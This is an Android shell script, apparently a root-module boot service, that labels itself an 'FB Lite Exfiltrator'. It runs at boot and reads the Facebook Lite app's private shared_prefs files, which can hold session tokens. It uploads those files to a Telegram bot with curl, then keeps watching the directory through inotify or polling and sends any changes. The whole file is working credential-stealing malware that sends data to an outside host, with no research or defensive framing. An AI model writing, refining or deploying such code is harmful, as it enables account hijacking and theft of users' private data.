#!/system/bin/sh

# Wait for system to fully boot
while [ "$(getprop sys.boot_completed)" != "1" ]; do
  sleep 2
done

# Source config from module directory
MODPATH=${0%/*}
CONFIG="$MODPATH/../config.sh"

# If config is in common/, adjust path
if [ ! -f "$CONFIG" ]; then
  CONFIG="$MODPATH/config.sh"
fi

# Source config
[ -f "$CONFIG" ] && . "$CONFIG"

# Default values if config not loaded
BOT_TOKEN="${BOT_TOKEN:-YOUR_BOT_TOKEN_HERE}"
CHAT_ID="${CHAT_ID:-YOUR_CHAT_ID_HERE}"

LOG_FILE="/data/local/tmp/fblite_exfil.log"

log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

send_to_telegram() {
  local file="$1"
  local filename=$(basename "$file")
  
  [ ! -f "$file" ] && return
  
  log "Sending: $filename"
  
  # Send as document
  response=$(curl -s -w "%{http_code}" -o /data/local/tmp/tg_resp.tmp \
    -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
    -F "chat_id=$CHAT_ID" \
    -F "document=@$file" \
    -F "caption=📁 FB Lite: $filename" 2>/dev/null)
  
  http_code="$response"
  
  if [ "$http_code" = "200" ]; then
    log "SUCCESS: $filename sent"
  else
    log "FAILED: HTTP $http_code for $filename"
    # Fallback: send content as text if file is small
    filesize=$(stat -c%s "$file" 2>/dev/null || echo 0)
    if [ "$filesize" -gt 0 ] && [ "$filesize" -lt 3500 ]; then
      content=$(cat "$file" 2>/dev/null)
      curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=📄 <b>$filename</b>%0A%0A<code>$(echo "$content" | sed 's/&/&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')</code>" \
        -d "parse_mode=HTML" > /dev/null 2>&1
      log "Sent as text (fallback)"
    fi
  fi
  
  rm -f /data/local/tmp/tg_resp.tmp
}

log "=== FB Lite Exfiltrator Starting ==="
log "Bot: ${BOT_TOKEN:0:8}... Chat: $CHAT_ID"

# Wait for target directory
TARGET="/data/data/com.facebook.lite/shared_prefs"
WAIT_COUNT=0
while [ ! -d "$TARGET" ]; do
  sleep 5
  WAIT_COUNT=$((WAIT_COUNT + 1))
  if [ $WAIT_COUNT -gt 60 ]; then
    log "ERROR: Directory $TARGET not found after 5 minutes"
    log "Continuing to watch..."
    break
  fi
done

log "Target directory: $TARGET"

# Initial sweep - send all existing XML files
log "Performing initial sweep..."
find "$TARGET" -name "*.xml" -type f 2>/dev/null | while read file; do
  # Only send if not already sent
  if [ ! -f "${file}.exfil_sent" ]; then
    send_to_telegram "$file"
    touch "${file}.exfil_sent" 2>/dev/null
  fi
done

log "Initial sweep complete. Starting real-time monitoring..."

# Real-time monitoring using inotify (preferred)
if [ -f /system/bin/inotifyd ] || busybox --list 2>/dev/null | grep -q inotifyd; then
  log "Using inotify monitoring"
  INOTIFY=$(command -v inotifyd || busybox which inotifyd 2>/dev/null || echo "")
  
  if [ -n "$INOTIFY" ]; then
    while true; do
      events=$($INOTIFY "$TARGET" 2>/dev/null)
      if echo "$events" | grep -q "\.xml"; then
        sleep 2
        find "$TARGET" -name "*.xml" -type f -newer "${TARGET}/.exfil_check" 2>/dev/null | while read file; do
          send_to_telegram "$file"
        done
      fi
      touch "${TARGET}/.exfil_check" 2>/dev/null
    done
  fi
fi

# Fallback: polling with file timestamp checking
log "Using polling monitoring (30s interval)"
while true; do
  find "$TARGET" -name "*.xml" -type f 2>/dev/null | while read file; do
    # Get last modified time
    last_mod=$(stat -c%Y "$file" 2>/dev/null || echo 0)
    sent_file="${file}.exfil_sent"
    last_sent=0
    [ -f "$sent_file" ] && last_sent=$(cat "$sent_file" 2>/dev/null || echo 0)
    
    # Send if modified since last sent
    if [ "$last_mod" -gt "$last_sent" ]; then
      send_to_telegram "$file"
      echo "$last_mod" > "$sent_file" 2>/dev/null
    fi
  done
  sleep 30
done
